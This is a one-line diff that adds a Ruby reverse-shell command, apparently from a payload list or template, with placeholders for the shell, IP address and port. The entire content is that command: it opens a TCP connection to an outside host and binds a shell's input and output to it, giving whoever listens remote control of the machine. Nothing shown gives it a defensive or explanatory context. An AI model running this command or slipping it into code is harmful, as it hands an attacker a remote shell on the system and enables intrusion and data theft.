@@ -1,0 +1,1 @@
+ruby -rsocket -e'spawn("SHELL",[:in,:out,:err]=>TCPSocket.new("IP",PORT))'
